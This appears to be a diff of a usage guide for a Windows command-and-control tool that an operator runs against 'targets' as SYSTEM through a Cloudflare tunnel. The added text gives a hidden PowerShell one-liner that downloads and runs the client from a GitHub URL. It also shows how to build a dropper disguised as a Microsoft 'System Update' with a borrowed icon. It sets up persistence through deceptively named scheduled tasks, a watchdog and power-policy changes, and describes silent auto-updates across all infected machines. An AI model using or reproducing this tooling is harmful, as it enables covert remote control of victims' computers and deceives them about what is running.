@@ -1,402 +1,333 @@
-# Shell C2 — Usage Guide
+# Shell C2 — Usage Guide (v2.8.0)
 
 ## Architecture
 
 ```
-[Mac] server.py  ←—Cloudflare Tunnel—→  [Windows] pdf2.ps1
-  operator types commands                 executes & streams output back
+[Mac/Linux]                                [Windows Target]
+server.py  ←── Cloudflare Tunnel ──→  pdf2.ps1 (SYSTEM)
+  port 4444                              polls /cmd, streams output
 ```
 
-- `server.py` runs on your **Mac** — your operator terminal.
-- `pdf2.ps1` runs on the **Windows** target, connects back via Cloudflare Tunnel, executes commands, and streams output back.
+- `server.py` — operator terminal on Mac/Linux
+- `pdf2.ps1` — Windows client, runs as SYSTEM, auto-persists, auto-updates
 
 ---
 
-## Starting Up (Order Matters)
-
-Always start in this order to avoid connection errors:
+## Startup (Order Matters)
 
 ```bash
-# 1. Start the Python server first
+# 1. Start the server
 python3 server.py
 
-# 2. Start the Cloudflare tunnel (in a separate terminal)
-cloudflared tunnel --config ~/.cloudflared/config.yml run hostel-mac
+# 2. Start the Cloudflare tunnel (separate terminal)
+cloudflared tunnel run <your-tunnel-name>
 
-# 3. Run pdf2.ps1 on the Windows target
+# 3. Deploy client on Windows (see Deployment below)
 ```
 
-> **Why order matters:** If the tunnel starts before `server.py`, cloudflared can't reach port 4444 and logs `connection refused`. The Windows client will retry with exponential backoff automatically once the server is up.
+> **Why order matters:** If tunnel starts before `server.py`, cloudflared can't reach port 4444 and logs `connection refused`. The client retries automatically with exponential backoff.
+
+---
+
+## Deployment
+
+### Option A — One-liner (PowerShell)
+
+```powershell
+Start-Process powershell -Verb RunAs -ArgumentList '-ep bypass -w hidden -c "[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12;Invoke-WebRequest ''https://raw.githubusercontent.com/pentoshi007/test/main/pdf2.ps1'' -OutFile ''C:\pdf2.ps1'' -UseBasicParsing;& ''C:\pdf2.ps1''"'
+```
+
+Triggers UAC → downloads to `C:\pdf2.ps1` → installs persistence → connects.
+
+### Option B — EXE Dropper (one-click)
+
+Build from `loader.ps1` using PS2EXE:
+
+```powershell
+# Install PS2EXE (one time)
+Install-Module ps2exe -Force -Scope CurrentUser
+
+# Build the .exe
+Invoke-PS2EXE -InputFile .\loader.ps1 -OutputFile .\SystemUpdate.exe `
+  -requireAdmin -noConsole -noOutput `
+  -iconFile .\icon.ico `
+  -title "System Update" -description "System Management" `
+  -company "Microsoft" -version "1.0.0"
+```
+
+**Adding an icon:**
+
+```powershell
+# Extract Windows Update icon
+Add-Type -AssemblyName System.Drawing
+$icon = [System.Drawing.Icon]::ExtractAssociatedIcon("C:\Windows\System32\wuauclt.exe")
+$fs = [System.IO.FileStream]::new(".\icon.ico", [System.IO.FileMode]::Create)
+$icon.Save($fs); $fs.Close()
+```
+
+Double-click `SystemUpdate.exe` → UAC prompt → downloads & runs pdf2.ps1 → done.
 
 ---
 
 ## Operator Commands
 
-Type these at the prompt — they are **not** sent to the remote shell.
+### Session Management
 
-| Command           | What it does                                               |
-| ----------------- | ---------------------------------------------------------- |
-| `sessions`        | List all connected clients with status                     |
-| `use <id>`        | Switch active target (by hostname or number from sessions) |
-| `cancel`          | Abort the running command on the active client             |
-| `Ctrl+\`          | Same as cancel (keyboard shortcut)                         |
-| `status`          | Check active client connectivity                           |
-| `kill <id>`       | Send exit to a specific client                             |
-| `remove <id>`     | Remove a stale/dead client from the sessions list          |
-| `exit`            | Shut down the server                                       |
-| `help`            | Show available commands                                    |
-| _(anything else)_ | Sent as a command to the active client's shell             |
-
----
-
-## Multi-Client Support
-
-When multiple Windows machines are running the client script, each identifies itself by hostname. The server tracks them independently.
-
-**List all connected clients:**
+| Command | Description | Example |
+|---|---|---|
+| `sessions` | List all connected clients | `sessions` |
+| `use <id>` | Switch active target (number or name) | `use 1` or `use DESKTOP` |
+| `status` | Check if active client is online | `status` |
+| `kill <id>` | Send exit to client (full cleanup) | `kill 1` or `kill DESKTOP` |
+| `remove <id>` | Remove stale client from list | `remove 2` |
 
 ```
 shell> sessions
 [*] 2 client(s):
-  [1] DESKTOP-ABC           ONLINE (IDLE) — 1.2s ago
-  [2] LAPTOP-XYZ            ONLINE (RUNNING) — 0.8s ago ←
-```
+  [1] DESKTOP-ABC    ONLINE (IDLE) — 1.2s ago
+  [2] LAPTOP-XYZ     ONLINE (RUNNING) — 0.8s ago ←
 
-The `←` marker shows the currently active target.
-
-**Select a target (by number or name):**
-
-```
 shell> use 1
 [*] Active target: DESKTOP-ABC
 
 DESKTOP-ABC> whoami
+nt authority\system
 ```
 
-You can also use partial hostname matching:
+> **⚠ Important:** `exit` shuts down the **server**. Use `kill <id>` to stop a **client**.
 
-```
-shell> use laptop
-[*] Active target: LAPTOP-XYZ
-```
+### Command Control
 
-**Switch between clients freely:**
+| Command | Description |
+|---|---|
+| `cancel` | Abort running command on active client |
+| `Ctrl+\` | Same as cancel (keyboard shortcut) |
 
-```
-DESKTOP-ABC> use 2
-[*] Active target: LAPTOP-XYZ
+> `Ctrl+C` exits `server.py` entirely. Use `Ctrl+\` or `cancel` to stop just the remote command.
 
-LAPTOP-XYZ> ipconfig /all
-```
+### Client Commands (sent to remote machine)
 
-**Kill a specific client:**
+| Command | Description | Example |
+|---|---|---|
+| `version` | Show client version, host, PID | `version` |
+| `update` | Force immediate self-update from GitHub | `update` |
+| `gui:<cmd>` | Launch GUI app on user's desktop | `gui:explorer .` |
+| `notimeout:<cmd>` | Run without 300s timeout | `notimeout:ping -t 8.8.8.8` |
 
-```
-shell> kill 2
-[*] Exit command sent to LAPTOP-XYZ.
-```
+### Server Commands
+
+| Command | Description |
+|---|---|
+| `exit` | Shut down THIS server (not the client!) |
+| `help` | Show command reference |
 
 ---
 
-## Cancelling a Running Command
+## GUI Launch (`gui:` prefix)
 
-**Two ways:**
-
-**1. Keyboard shortcut — `Ctrl+\`** _(recommended)_
-Press `Ctrl+\` at any time while a command is running. This sends an instant cancel signal without needing to type anything.
-
-**2. Type `cancel`**
+Since the client runs as SYSTEM (Session 0, no desktop), normal GUI apps are invisible. The `gui:` prefix launches apps visibly on the logged-in user's desktop.
 
 ```
-shell> cancel
+DESKTOP-ABC> gui:explorer .        → Opens Explorer in current dir
+DESKTOP-ABC> gui:notepad           → Opens Notepad
+DESKTOP-ABC> gui:code .            → Opens VS Code (auto-resolves path)
+DESKTOP-ABC> gui:calc              → Opens Calculator
 ```
 
-The cancel signal is picked up by the client on its next poll (~200ms), stops the command, and replies:
+**How it works:** Creates a temporary scheduled task as the logged-in user with `Interactive` logon → runs on their visible desktop → task auto-deleted after 3 seconds.
 
-```
-[!] Command cancelled by operator.
-```
+**Error handling:**
+- **File not found (0x80070002)** — exe doesn't exist
+- **Access denied (0x80070005)** — permission issue
+- Non-zero exit codes from GUI apps (like Explorer's `1`) are treated as success
 
-> **Note:** `Ctrl+C` exits `server.py` entirely — use `Ctrl+\` or type `cancel` to stop just the remote command.
+**Exe resolution:** SYSTEM doesn't have the user's PATH. The script searches common install locations for VS Code, Sublime Text, and Cursor automatically.
 
 ---
 
-## Long-Running Commands (No Timeout)
+## Version & Update
 
-Default timeout is **300 seconds**. For commands that legitimately run longer, prefix with `notimeout:`:
-
-```
-shell> notimeout:ping -t google.com
-shell> notimeout:netstat -an
-```
-
-The header confirms the mode:
+### Check running version
 
 ```
-PS C:\> ping -t google.com [no-timeout]
+DESKTOP-ABC> version
+[*] Client Version: v2.8.0
+    Host: DESKTOP-ABC
+    User: SYSTEM
+    PID: 4312
+    Path: C:\pdf2.ps1
 ```
 
-Always use `Ctrl+\` or `cancel` to stop a no-timeout command when done.
+### Manual update
+
+```
+DESKTOP-ABC> update
+[*] Checking for updates from GitHub...
+[+] Updated to new version! Restarting via watchdog in ~1 min...
+```
+
+### Auto-update
+
+Checks GitHub every 30 minutes. If the SHA256 hash differs:
+
+```
+Download latest → Hash compare → Overwrite C:\pdf2.ps1
+→ Release mutex → Exit → Watchdog relaunches ≤1 min
+```
+
+No UAC popup. No manual intervention. Push to GitHub → all targets update within 30 min.
+
+### First-time manual update (old version without `update` command)
+
+Run through C2:
+
+```
+[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12; Invoke-WebRequest 'https://raw.githubusercontent.com/pentoshi007/test/main/pdf2.ps1' -OutFile 'C:\pdf2.ps1' -UseBasicParsing; Write-Output 'Done'
+```
+
+Then `kill <id>` to restart the client. Watchdog relaunches with new version.
 
 ---
 
-## Interactive Mode (cmd, powershell, python, etc.)
+## Interactive Mode
 
-Typing a bare interactive binary name (no arguments) drops you into an interactive session where your input is forwarded as stdin to that process:
+Typing a bare interactive binary drops you into stdin-forwarding mode:
 
 ```
 DESKTOP-ABC> cmd
 PS C:\Windows\system32> cmd [300s] [interactive]
-Microsoft Windows [Version 10.0.22631.5189]
-(c) Microsoft Corporation. All rights reserved.
-
-DESKTOP-ABC [interactive]> whoami
 C:\Windows\System32>whoami
 nt authority\system
 
 DESKTOP-ABC [interactive]> cancel
-[*] Cancel signal queued for DESKTOP-ABC.
+[!] Command cancelled by operator.
 ```
 
-**How it works:**
+**Auto-detected:** `cmd`, `powershell`, `pwsh`, `python`, `python3`, `node`, `nslookup`, `ftp`, `telnet`, `wsl`, `bash`, `diskpart`
 
-- The prompt changes to `hostname [interactive]>` while the session is active.
-- Everything you type is sent as stdin to the remote process (not as a new PowerShell command).
-- Output streams back in real time.
-- Type `cancel` or press `Ctrl+\` to kill the interactive process and return to normal mode.
-
-**Auto-detected interactive binaries:**
-
-`cmd`, `powershell`, `pwsh`, `python`, `python3`, `node`, `nslookup`, `ftp`, `telnet`, `wsl`, `bash`, `diskpart`
-
-These are only routed to interactive mode when typed **without arguments**. With arguments (e.g. `python script.py`, `cmd /c dir`) they run as normal commands.
-
-**Note:** The client runs as `NT AUTHORITY\SYSTEM` when installed via scheduled task. SYSTEM has a minimal PATH, so binaries like `python` or `node` may not be found unless installed system-wide. Use full paths if needed (e.g. `C:\Python312\python.exe`).
+> Only bare commands trigger interactive mode. With args (e.g. `python script.py`) they run normally.
 
 ---
 
-## Viewing Truncated Output (Full Result)
+## Long-Running Commands
 
-Output chunks are capped at **32,000 bytes**. If a command produces more, the chunk is trimmed with `[...truncated]`.
-
-**Workaround — pipe to a file and read it in parts:**
+Default timeout: **300 seconds**. Use `notimeout:` prefix for longer:
 
 ```
-# Step 1: redirect output to a file on the target
-shell> some-command > C:\output.txt
-
-# Step 2: read it in chunks
-shell> Get-Content C:\output.txt -TotalCount 100    # first 100 lines
-shell> Get-Content C:\output.txt -Tail 100           # last 100 lines
-shell> Get-Content C:\output.txt | Select-Object -Skip 100 -First 100  # lines 101–200
+DESKTOP-ABC> notimeout:ping -t 8.8.8.8
+PS C:\> ping -t 8.8.8.8 [no-timeout]
+...
 ```
 
-**Or limit output at the source:**
-
-```
-shell> Get-Process | Select-Object -First 30
-shell> dir C:\ | Where-Object { $_.Name -like "*.txt" }
-```
+Use `Ctrl+\` or `cancel` to stop when done.
 
 ---
 
-## Checking Client Status
+## Persistence
 
-```
-shell> status
-```
-
-Possible outputs:
-
-| Output                                                     | Meaning                                 |
-| ---------------------------------------------------------- | --------------------------------------- |
-| `Client ONLINE (IDLE) — last check-in 1.2s ago`            | Connected, waiting for commands         |
-| `Client ONLINE (RUNNING command) — last check-in 0.4s ago` | Currently executing                     |
-| `Client may be OFFLINE — last check-in 45s ago`            | No recent ping — may have crashed       |
-| `No client check-in yet.`                                  | Client has never connected this session |
-
-The server also auto-warns if there's been no check-in for 20+ seconds.
-
----
-
-## Sending Remote Commands
-
-Just type any PowerShell command at `shell>`:
-
-```
-shell> whoami
-shell> ipconfig /all
-shell> Get-Process | Sort-Object CPU -Descending | Select-Object -First 10
-```
-
-The command header shows prompt path and timeout mode:
-
-```
-PS C:\Windows\system32> whoami [300s]
-PS C:\> ping -t google.com [no-timeout]
-```
-
----
-
-## Persistence & Crash Recovery
-
-The client installs itself as a Windows Scheduled Task (`SystemManagementUpdate`):
-
-- **Trigger:** At system startup
-- **Auto-restart on crash:** Up to 3 restarts, 10-second delay each
-
-Check it in Task Scheduler → `SystemManagementUpdate` → Settings tab.
+| Mechanism | Purpose |
+|---|---|
+| `SystemManagementUpdate` task | Runs at startup + logon as SYSTEM |
+| `SystemManagementUpdateWatchdog` task | Every 1 min, relaunches if killed |
+| Anti-sleep power policy | Lid close = do nothing, standby disabled |
+| WakeToRun | Wakes from sleep for watchdog |
+| Self-kill + restart | After 5 min continuous failure, fresh restart |
 
 ---
 
 ## Log File (`shell.txt`)
 
-Located in the same directory as `pdf2.ps1`. Auto-rotates at 5 MB (old log → `shell.txt.old`).
+Located at `C:\shell.txt` (same dir as script). Auto-rotates at 5 MB.
 
-Common log entries:
-
-| Entry                                    | Meaning                                             |
-| ---------------------------------------- | --------------------------------------------------- |
-| `Client started. PID=...`                | Client launched                                     |
-| `CMD: <command>`                         | Command received from server                        |
-| `Created new persistent runspace`        | First command of session (normal)                   |
-| `Connection error #N: (530)`             | Cloudflare tunnel not ready yet — client will retry |
-| `Connection error #N: (502) Bad Gateway` | Server unreachable — check `server.py` is running   |
-| `Command timed out`                      | Command hit 300s limit — use `notimeout:` if needed |
-| `Command cancelled`                      | Operator triggered cancel                           |
+| Entry | Meaning |
+|---|---|
+| `Client v2.8.0 started. PID=...` | Client launched |
+| `CMD: <command>` | Command received |
+| `Connection error #N` | Cloudflare tunnel issue — auto retries |
+| `Update found! Hash xxx.. -> yyy..` | Auto-update applying |
+| `Manual update triggered` | Operator ran `update` |
+| `GUI launched: code . as USER` | GUI app launched successfully |
 
 ---
 
-## Troubleshooting
+## Client Status
 
-### "connection refused" in cloudflared logs
-
-`server.py` wasn't running when the tunnel started. Start `server.py` first.
-
-### 530 errors in shell.txt
-
-Cloudflare tunnel wasn't established yet when the client started. The client retries automatically with exponential backoff — no action needed if the tunnel comes up within a minute.
-
-### 400 Bad Request / "Unsolicited response on idle HTTP channel"
-
-This was a known bug — fixed. The server now sends `Connection: close` on every response, preventing cloudflared from trying to reuse connections with HTTP/2 frames on an HTTP/1.1 socket.
-
-### Output streaming feels slow
-
-Output streams adaptively: ~200ms when output is flowing, up to 1s when idle. If everything looks slow, check `status` — the client may be offline.
-
----
-
-## Output Streaming Behaviour
-
-| Condition                  | Flush interval |
-| -------------------------- | -------------- |
-| Output actively flowing    | ~200 ms        |
-| No output for a few cycles | ~500 ms        |
-| Idle (no output)           | ~1000 ms       |
-
----
-
-## Finding Running Processes & Full Cleanup
-
-### Mac — server.py
-
-**Find the process:**
-
-```bash
-pgrep -a python3 | grep server.py
-# or
-ps aux | grep server.py
+```
+shell> status
 ```
 
-**Kill it:**
+| Output | Meaning |
+|---|---|
+| `ONLINE (IDLE) — 1.2s ago` | Connected, waiting |
+| `ONLINE (RUNNING) — 0.4s ago` | Executing a command |
+| `may be OFFLINE — 45s ago` | No recent check-in |
+
+Server auto-warns if no check-in for 20+ seconds.
+
+---
+
+## Cleanup (Full Uninstall)
+
+### From the server (cleanest)
+
+```
+shell> kill 1
+```
+
+This sends `exit` to the client which:
+- ✅ Removes both scheduled tasks
+- ✅ Deletes `C:\pdf2.ps1` and `C:\shell.txt`
+- ✅ Restores lid-close and standby power policy
+- ✅ Cleans up any GUI tasks
+- ✅ Releases mutex and exits
+
+### Manual cleanup on Windows (run as Admin)
+
+```powershell
+Unregister-ScheduledTask -TaskName "SystemManagementUpdate" -Confirm:$false
+Unregister-ScheduledTask -TaskName "SystemManagementUpdateWatchdog" -Confirm:$false
+Remove-Item C:\pdf2.ps1, C:\shell.txt -Force -ErrorAction SilentlyContinue
+powercfg /setacvalueindex SCHEME_CURRENT SUB_BUTTONS LIDACTION 1
+powercfg /change standby-timeout-ac 30
+powercfg /setactive SCHEME_CURRENT
+```
+
+### Mac — stop server
 
 ```bash
 pkill -f server.py
-# or use the PID from above:
-kill <PID>
-```
-
-**Stop the Cloudflare tunnel:**
-
-```bash
 pkill cloudflared
 ```
 
 ---
 
-### Windows — pdf2.ps1 (target machine)
+## Troubleshooting
 
-**Send a clean shutdown from the server** _(preferred)_:
-
-```
-shell> exit
-```
-
-This tells the client to break its loop and exit gracefully.
-
-**Find the process manually (run on Windows):**
-
-```powershell
-Get-Process powershell | Where-Object { $_.MainWindowTitle -eq "" }
-# or find by PID from shell.txt:
-Get-Process -Id <PID>
-```
-
-**Kill it manually (run on Windows):**
-
-```powershell
-Stop-Process -Id <PID> -Force
-# or kill all hidden PowerShell instances:
-Get-Process powershell | Where-Object { $_.MainWindowTitle -eq "" } | Stop-Process -Force
-```
-
----
-
-### Full Cleanup on Windows (remove persistence + logs)
-
-Run these on the Windows target to completely remove the client:
-
-```powershell
-# 1. Kill the running process
-$logPath = "C:\path\to\shell.txt"   # adjust to actual path
-$content = Get-Content $logPath | Where-Object { $_ -match "PID=(\d+)" }
-# or just:
-Get-Process powershell | Where-Object { $_.MainWindowTitle -eq "" } | Stop-Process -Force
-
-# 2. Remove the scheduled task
-Unregister-ScheduledTask -TaskName "SystemManagementUpdate" -Confirm:$false
-
-# 3. Delete log files
-Remove-Item "C:\path\to\shell.txt" -Force -ErrorAction SilentlyContinue
-Remove-Item "C:\path\to\shell.txt.old" -Force -ErrorAction SilentlyContinue
-
-# 4. Delete the script itself
-Remove-Item "C:\path\to\pdf2.ps1" -Force
-```
-
-**Verify the task is gone:**
-
-```powershell
-Get-ScheduledTask -TaskName "SystemManagementUpdate" -ErrorAction SilentlyContinue
-# Should return nothing if successfully removed
-```
+| Problem | Fix |
+|---|---|
+| `connection refused` in cloudflared | Start `server.py` before the tunnel |
+| `530` errors in shell.txt | Tunnel not ready yet — auto retries |
+| `update` says "already latest" | GitHub CDN caching — wait 2-3 min and retry |
+| `version` / `update` not recognized | Client running old version — see "First-time manual update" |
+| GUI app not found | Use full path: `gui:C:\path\to\app.exe` |
+| `exit` killed the server | `exit` = server shutdown. Use `kill <id>` for clients |
 
 ---
 
 ## Quick Reference
 
-| Action                 | How                                   |
-| ---------------------- | ------------------------------------- |
-| List clients           | `sessions`                            |
-| Select a target        | `use <id or number>`                  |
-| Cancel running command | `Ctrl+\` or type `cancel`             |
-| Kill the server        | `Ctrl+C`                              |
-| Run with no timeout    | `notimeout:<command>`                 |
-| Interactive shell      | `cmd`, `powershell`, `python` (bare)  |
-| Check connectivity     | `status`                              |
-| Shut down a client     | `kill <id or number>`                 |
-| Remove stale client    | `remove <id or number>`               |
-| Shut down the server   | `exit`                                |
-| View help              | `help`                                |
-| Read long output       | Pipe to file, read with `Get-Content` |
+| Action | Command |
+|---|---|
+| List clients | `sessions` |
+| Select target | `use <id>` or `use <name>` |
+| Check version | `version` |
+| Force update | `update` |
+| Launch GUI app | `gui:<cmd>` |
+| No-timeout run | `notimeout:<cmd>` |
+| Cancel command | `Ctrl+\` or `cancel` |
+| Interactive shell | `cmd`, `python` (bare) |
+| Kill a client | `kill <id>` |
+| Remove stale | `remove <id>` |
+| Check connectivity | `status` |
+| Shut down server | `exit` |
+| View help | `help` |
